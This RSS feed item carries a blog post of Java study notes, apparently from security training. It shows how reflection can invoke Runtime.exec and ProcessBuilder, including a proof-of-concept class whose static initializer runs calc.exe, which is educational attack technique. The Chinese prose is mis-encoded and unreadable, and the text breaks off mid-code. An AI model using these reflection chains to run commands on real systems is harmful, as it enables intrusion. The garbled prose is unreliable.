<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Javaå­¦ä¹ ç¬”è®° on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/series/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link><description>Recent content in Javaå­¦ä¹ ç¬”è®° on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 04 May 2022 16:03:58 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/series/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.xml" rel="self" type="application/rss+xml"/><item><title>Javaå­¦ä¹ ç¬”è®°â…£</title><link>https://amiaaaz.github.io/2022/05/04/java-study-notes-04/</link><pubDate>Wed, 04 May 2022 16:03:58 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/04/java-study-notes-04/</guid><description>&lt;p>pç‰›å®‰å…¨æ¼«è°ˆå­¦ä¹ &lt;/p>
&lt;h2 id="åå°„">åå°„&lt;/h2>
&lt;p>å…³äºŽåŠ¨æ€ç‰¹æ€§ï¼Œpç‰›ç»™å‡ºäº†è¿™æ ·çš„å®šä¹‰&lt;/p>
&lt;blockquote>
&lt;p>ä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–&lt;/p>
&lt;/blockquote>
&lt;p>PHPçš„ä¸€å¥è¯ðŸŽä¹Ÿæ­£æ˜¯è¿™ä¸ªç‰¹æ€§çš„ä½“çŽ°ä¹‹ä¸€ï¼Œjavaè™½ç„¶æ²¡æœ‰PHPè¿™ä¹ˆçµæ´»ï¼Œä½†æ˜¯å¼ºå¤§çš„åå°„åŠŸèƒ½ä¹Ÿå¯ä»¥æä¾›ä¸€äº›åŠ¨æ€ç‰¹æ€§ï¼Œæ¯”å¦‚è¿™æ ·çš„å‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// æ‰§è¡Œ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€ç»ˆæ‰§è¡Œçš„æ–¹æ³•æ ¹æ®ä¼ å…¥çš„å‚æ•°è€Œå®š&lt;/p>
&lt;h3 id="forname">forName&lt;/h3>
&lt;p>èŽ·å–ä¸€ä¸ª&lt;code>class&lt;/code>çš„&lt;code>Class&lt;/code>å®žä¾‹çš„æ–¹å¼ä¹‹ä¸€æ˜¯&lt;code>Class.forName&lt;/code>ï¼Œå®ƒæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// å¸¸ç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">initialize&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">loader&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œå®Œæ•´è·¯å¾„ï¼ˆå¦‚æžœå¯æŽ§å°±å¯ä»¥åŠ è½½ä»»æ„ç±»ï¼‰ï¼Œå¦‚æžœåŠ è½½å†…éƒ¨ç±»å¯ä»¥ç”¨&lt;code>Class.forName(&amp;quot;C1$C2&amp;quot;)&lt;/code>&lt;/p>
&lt;p>ç¬¬ä¸‰ä¸ªå‚æ•°&lt;code>ClassLoader&lt;/code>çš„ä½œç”¨æ˜¯å‘Šè¯‰JVMå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„&lt;code>ClassLoader&lt;/code>å°±æ˜¯æ ¹æ®ç±»åï¼ˆç±»å®Œæ•´è·¯å¾„ï¼‰æ¥åŠ è½½ç±»&lt;/p>
&lt;p>å¯¹äºŽç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ä½¿æˆ‘ä»¬è®¾ç½®&lt;code>true&lt;/code>ï¼Œä¹Ÿä¸ä¼šåœ¨æ‰§è¡Œ&lt;code>forName&lt;/code>æ—¶æ‰§è¡Œæž„é€ å‡½æ•°ï¼Œå› ä¸ºè¿™é‡Œçš„&lt;code>initialize&lt;/code>æŒ‡çš„æ˜¯ç±»çš„åˆå§‹åŒ–ï¼Œè°ƒç”¨å…¶ä¸­çš„&lt;code>static&lt;/code>éƒ¨åˆ†ä»£ç &lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç±»çš„å®žä¾‹åŒ–(newInstance)ï¼šstatic{} -&amp;gt; {} -&amp;gt; æž„é€ å‡½æ•°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç±»çš„åˆå§‹åŒ–(initial)ï¼šstatic{}&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ç”±æ­¤ï¼Œå¦‚æžœ&lt;code>forName&lt;/code>çš„å‚æ•°å¯æŽ§ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™æ¶æ„ç±»ï¼ˆæ¶æ„ä»£ç ä½äºŽstaticä¸­ï¼‰ï¼Œè¿›è€Œå®Œæˆå¯¹æŒ‡å®šç±»çš„åˆå§‹åŒ– è§¦å‘static{}éƒ¨åˆ†ï¼›ç¼–å†™poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">victim&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ref.exp&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">exp&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span> &lt;span style="color:#111">rt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Process&lt;/span> &lt;span style="color:#111">ps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">rt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;error here&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="getmethodinvoke">getMethod&amp;amp;invoke&lt;/h3>
&lt;p>&lt;code>Class.newInstance&lt;/code>è°ƒç”¨çš„æ˜¯è¯¥ç±»çš„publicæ— å‚æž„é€ å‡½æ•°ï¼Œè€Œæœ‰å‚æ•°çš„æž„é€ æ–¹æ³• æˆ–éž&lt;code>public&lt;/code>çš„æž„é€ æ–¹æ³•éƒ½æ— æ³•é€šè¿‡&lt;code>Class.newInstance()&lt;/code>è°ƒç”¨ï¼Œæ¯”å¦‚&lt;code>Runtime&lt;/code>çš„æž„é€ æ–¹æ³•å°±æ˜¯ç§æœ‰çš„ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰ï¼Œä¸‹é¢çš„æ —å­å°±æ— æ³•æ‰§è¡Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é‰´äºŽæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;code>Runtime.getRuntime&lt;/code>èŽ·å–åˆ°&lt;code>Runtime&lt;/code>å¯¹è±¡ï¼Œè¿™é‡ŒæŒ‡å®šçš„é‡è½½ä¸ºæœ€ç®€å•çš„&lt;code>exec&lt;/code>ï¼Œä¾æ—§æ˜¯é€šè¿‡invokeè°ƒç”¨ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>invoke&lt;/code>ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå¦‚æžœè¿™ä¸ªæ–¹æ³•æ˜¯æ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ï¼›å¦‚æžœæ˜¯é™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»ï¼Œä¸Šé¢çš„payloadç›¸å½“äºŽ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">execMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">getRuntimeMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">runtime&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getRuntimeMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">execMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">runtime&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦ä¸€ä¸ªAPIæ˜¯&lt;code>getDeclaredMethod&lt;/code>ï¼ŒèŽ·å–å½“å‰ç±»å£°æ˜Žçš„æ‰€æœ‰æ–¹æ³•ï¼ˆä¸åŒ…æ‹¬ä»Žçˆ¶ç±»ç»§æ‰¿æ¥çš„æ–¹æ³• åŒ…å«å½“å‰ç±»çš„ç§æœ‰æ–¹æ³•ï¼‰ï¼Œç»“åˆè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªapièŽ·å–åˆ°&lt;code>Runtime&lt;/code>å¯¹è±¡å¹¶è°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„å¿…é¡»åŒæ—¶è®¾ç½®&lt;code>setAccessible(true)&lt;/code>ä¿®æ”¹ä½œç”¨åŸŸ&lt;/p>
&lt;h3 id="getconstructor">getConstructor&lt;/h3>
&lt;p>å½“ä¸€ä¸ªç±»æ²¡æœ‰publicçš„æ— å‚æž„é€ æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆç”¨&lt;code>getConstructor&lt;/code>èŽ·å–åˆ°æž„é€ å‡½æ•°ï¼ˆéœ€è¦ä¼ å…¥å‚æ•°ç±»åž‹ å› ä¸ºå¯ä»¥æœ‰å¤šç§æž„é€ å‡½æ•°ï¼‰ï¼Œä¹‹åŽç”¨&lt;code>newInstance&lt;/code>å®žä¾‹åŒ–å¯¹è±¡ï¼Œå†ç»è¿‡å¼ºåˆ¶ç±»åž‹è½¬æ¢åŽç”¨&lt;code>start&lt;/code>æ‰§è¡Œï¼›è¿™é‡Œç”¨ProcessBuilderä½œç¤ºä¾‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">))).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœç›®æ ‡çŽ¯å¢ƒæ²¡æœ‰å¼ºåˆ¶ç±»åž‹è½¬æ¢æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡å€ŸåŠ©åå°„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span 